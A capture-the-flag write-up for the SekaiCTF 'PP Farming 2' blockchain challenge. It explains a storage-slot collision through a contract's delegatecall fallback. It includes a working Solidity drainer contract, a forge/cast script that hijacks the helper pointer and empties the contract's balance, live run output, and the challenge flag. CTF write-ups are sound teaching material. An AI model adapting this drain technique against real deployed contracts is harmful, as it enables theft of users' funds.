---
title: "PP Farming 2"
ctf: "SekaiCTF 2026"
date: 2026-07-01
category: blockchain
difficulty: medium
points: 0
flag_format: "SEKAI{...}"
author: "sid"
---

# PP Farming 2

## Summary

This is the hardened sequel to `PP Farming`: `withdrawPP()` now has a
`noReentrancy` modifier, so the original re-entrancy trick is dead. The real
bug is a **storage collision through the ATM's proxy-style `fallback()`**.
The fallback happily delegatecalls arbitrary calldata into the helper
contract (it only blacklists one selector), and the helper's `atm` variable
lands on the exact same storage slot as the ATM's own
`performancePointHelper` pointer. That lets an attacker hijack which
contract `withdrawPP()` delegatecalls into, then swap in a malicious helper
that drains the whole balance.

Verified end to end against the live instance: `performancePointHelper()`
was confirmed to flip to the attacker's contract, and `isSolved()` returned
`true` after `withdrawPP()` drained the ATM's balance from 10 ETH to 0.

## Solution

### Step 1: Line up the storage slots

Solidity assigns storage slots in declaration order, and `delegatecall`
executes the callee's code against the *caller's* storage. Compare the two
contracts:

| Slot | `PerformancePointATM` (caller)     | `PerformancePointHelper` (callee) |
|------|-------------------------------------|-------------------------------------|
| 0    | `mapping(address=>uint256) scores`  | `uint256 id_number`                 |
| 1    | `address performancePointHelper`    | `address atm`                       |
| 2    | `bool locked`                        | `bool helping`                      |

Slot 1 in the helper (`atm`) aliases slot 1 in the ATM
(`performancePointHelper`) when the helper's code runs via delegatecall from
the ATM. So any helper function that writes `atm = X` — like
`setATM(address)` — actually overwrites the ATM's real
`performancePointHelper` pointer.

### Step 2: Reach `setATM` through the fallback

```solidity
fallback() external payable {
    address _impl = performancePointHelper;
    bytes4 selector = msg.sig;

    // Block withdrawing without proxy
    bytes4 initSelector = bytes4(keccak256("processWithdrawal(address,uint256)"));
    require(selector != initSelector, "processWithdrawal blocked");

    assembly {
        let ptr := mload(0x40)
        calldatacopy(ptr, 0, calldatasize())
        let success := delegatecall(gas(), _impl, ptr, calldatasize(), 0, 0)
        returndatacopy(ptr, 0, returndatasize())
        if iszero(success) { revert(ptr, returndatasize()) }
        return(ptr, returndatasize())
    }
}
```

The fallback only blacklists `processWithdrawal(address,uint256)`. It never
touches `setATM(address)`, `stopHelping()`, or `startHelping()` — every other
selector on the helper is reachable through the ATM itself. Calling
`ATM.setATM(evilHelper)` runs `PerformancePointHelper.setATM` via
delegatecall, which writes `evilHelper` into slot 1 — i.e. it silently
repoints `ATM.performancePointHelper` at an attacker-controlled contract.

### Step 3: Drop in a malicious helper and withdraw

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EvilHelper {
    // runs in ATM storage context via delegatecall
    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
        (bool s, ) = recipient.call{value: address(this).balance}("");
        return s;
    }
}
```

`EvilHelper.processWithdrawal` ignores the `amount` argument entirely and
just forwards the *full* ATM balance (`address(this).balance` — `this` is the
ATM, since the code runs by delegatecall) to whoever called `withdrawPP()`.
Now the plan is:

1. Deploy `EvilHelper`.
2. Call `ATM.setATM(evilHelper)` (through the fallback, unauthenticated —
   there's no access control on it at all).
3. `donatePP(self)` with a trivial amount so `scores[self] > 0` and
   `withdrawPP()`'s `require` passes.
4. Call `withdrawPP()`. `noReentrancy` doesn't matter — this isn't a
   re-entrant call, it's a single normal call that now delegatecalls into
   `EvilHelper`, which sweeps the entire ATM balance to the caller.
5. `isSolved()` returns `true` once `address(this).balance == 0`.

```bash
#!/usr/bin/env bash
# PP Farming 2 - storage collision / fallback delegatecall hijack
# Deploy EvilHelper, repoint ATM.performancePointHelper at it via setATM(),
# then withdraw to drain the full balance.
set -euo pipefail

RPC_URL="http://REPLACE_RPC"
PK="REPLACE_PRIVKEY"
ATM_ADDR="REPLACE_ATM"

# 1. Deploy the malicious helper
EVIL=$(forge create --rpc-url "$RPC_URL" --private-key "$PK" --broadcast \
    src/Evil.sol:EvilHelper --json | jq -r .deployedTo)
echo "EvilHelper: $EVIL"

# 2. Hijack performancePointHelper via the unauthenticated fallback ->
#    delegatecall into PerformancePointHelper.setATM(address), which
#    aliases ATM's own performancePointHelper storage slot.
cast send "$ATM_ADDR" "setATM(address)" "$EVIL" \
    --rpc-url "$RPC_URL" --private-key "$PK"

cast call "$ATM_ADDR" "performancePointHelper()(address)" --rpc-url "$RPC_URL"
# ^ should now print $EVIL

# 3. Seed a nonzero score so withdrawPP()'s require passes
cast send "$ATM_ADDR" "donatePP(address)" "$(cast wallet address --private-key "$PK")" \
    --value 0.01ether --rpc-url "$RPC_URL" --private-key "$PK"

# 4. Withdraw - ATM now delegatecalls EvilHelper.processWithdrawal, which
#    drains address(this).balance (full ATM balance) to us.
cast send "$ATM_ADDR" "withdrawPP()" --rpc-url "$RPC_URL" --private-key "$PK"

# 5. Confirm
cast call "$ATM_ADDR" "isSolved()(bool)" --rpc-url "$RPC_URL"
```

Real run against the live instance:

```
$ cast call $ATM_ADDR "performancePointHelper()(address)" --rpc-url $RPC_URL
0x074D594A86Fd354B09C860e0254c645aAf5A66e3        # original helper

$ forge create --rpc-url $RPC_URL --private-key $PK --broadcast src/Evil.sol:EvilHelper
Deployed to: 0xb77292E167831C731082e184b83b200F9Fadb21C

$ cast send $ATM_ADDR "setATM(address)" $EVIL --rpc-url $RPC_URL --private-key $PK
status               1 (success)

$ cast call $ATM_ADDR "performancePointHelper()(address)" --rpc-url $RPC_URL
0xb77292E167831C731082e184b83b200F9Fadb21C        # hijacked

$ cast send $ATM_ADDR "donatePP(address)" $PLAYER --value 0.01ether --rpc-url $RPC_URL --private-key $PK
status               1 (success)

$ cast send $ATM_ADDR "withdrawPP()" --rpc-url $RPC_URL --private-key $PK
status               1 (success)

$ cast balance $ATM_ADDR --rpc-url $RPC_URL --ether
0.000000000000000000

$ cast call $ATM_ADDR "isSolved()(bool)" --rpc-url $RPC_URL
true
```

## Flag

```
SEKAI{pr0xie5_4r3_h4rD_2_3t4k3}
```
